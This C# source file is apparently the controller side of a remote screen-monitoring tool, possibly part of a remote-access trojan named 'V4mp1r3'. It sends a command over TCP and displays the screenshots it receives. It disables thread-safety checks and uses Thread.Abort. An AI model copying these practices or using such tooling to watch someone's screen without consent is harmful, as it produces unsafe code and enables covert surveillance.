using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.IO;
using System.Threading;

namespace V4mp1r3
{
    public partial class frmSreenMonitor : Form
    {
        public frmSreenMonitor(TcpClient client)
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
            this.client = client;
        }
        TcpClient client;
        Thread thread;
        private void frmSreenMonitor_Load(object sender, EventArgs e)
        {
            Thread thread1 = new Thread(new ThreadStart(Monit));
            thread = thread1;
            thread.Start();
        }
        private void Monit()
        {
            NetworkStream clientStream = client.GetStream();
            BinaryWriter bw = new BinaryWriter(clientStream);
            bw.Write("srm");
            BinaryReader br = new BinaryReader(clientStream);
            while (true)
            {
                int length = br.ReadInt32();
                byte[] bytes = new byte[length];
                bytes = br.ReadBytes(length);
                MemoryStream ms = new MemoryStream(bytes);
                Bitmap imag = new Bitmap(ms);
                pictureBox1.Image = imag;
                bw.Write("");
            }
        }

        private void frmSreenMonitor_FormClosed(object sender, FormClosedEventArgs e)
        {
            NetworkStream clientStream = client.GetStream();
            BinaryWriter bw = new BinaryWriter(clientStream);
            bw.Write("stop");
            thread.Abort();
        }
    }
}
